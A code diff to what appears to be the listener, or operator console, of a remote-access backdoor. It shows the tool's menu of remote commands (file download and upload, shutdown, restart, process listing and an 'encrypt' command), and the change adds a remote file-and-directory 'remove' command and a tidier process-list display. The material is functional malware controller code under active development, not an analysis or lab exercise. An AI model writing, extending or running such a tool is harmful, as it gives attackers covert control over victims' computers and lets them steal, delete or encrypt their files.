@@ -127,6 +127,7 @@ class Listner:
         print("  cd <path>   - Change directory")
         print("  download <file> - Download a file")
         print("  upload <file>   - Upload a file")
+        print("  remove <file>   - Remove a file or directory")
         print("  shutdown    - Shutdown the system")
         print("  restart     - Restart the system")
         print("  logout      - Logout the user")
@@ -155,6 +156,7 @@ class Listner:
                     print("  cd <path>   - Change directory")
                     print("  download <file> - Download a file")
                     print("  upload <file>   - Upload a file")
+                    print("  remove <file>   - Remove a file or directory")
                     print("  shutdown    - Shutdown the system")
                     print("  restart     - Restart the system")
                     print("  logout      - Logout the user")
@@ -185,9 +187,20 @@ class Listner:
                     print("ram:",commandresult['ram'])
                 
                 elif command.split()[0].lower() == "bgps" and len(command.split()) == 1:
-                    from pprint import prettyprinter
-                    pprint = prettyprinter(indent=4)
-                    pprint.pprint(commandresult)
+                    if isinstance(commandresult, dict):
+                        print("\nRunning Processes:")
+                        print("-" * 50)
+                        for pid, info in commandresult.items():
+                            if isinstance(info, dict):
+                                print(f"PID: {pid}")
+                                print(f"Name: {info.get('name', 'N/A')}")
+                                print(f"User: {info.get('username', 'N/A')}")
+                                print("-" * 50)
+                            else:
+                                print(f"PID: {pid} - Name: {info}")
+                        print()
+                    else:
+                        print(commandresult)
                     
                 elif command.split()[0].lower() == 'encrypt' and len(command.split()) == 1:
                     print(commandresult)
@@ -202,6 +215,10 @@ class Listner:
                 elif command.split()[0].lower() == "upload" and len(command.split()) > 1:
                     self.send(self.upload(command.split()[1]).decode(),conn)
                     print("file uploded successfully!")
+                    
+                elif command.split()[0].lower() == "remove" and len(command.split()) > 1:
+                    self.remove(command.split()[1])
+                    print("file removed successfully!")
                     
                 else:
                     print(commandresult)
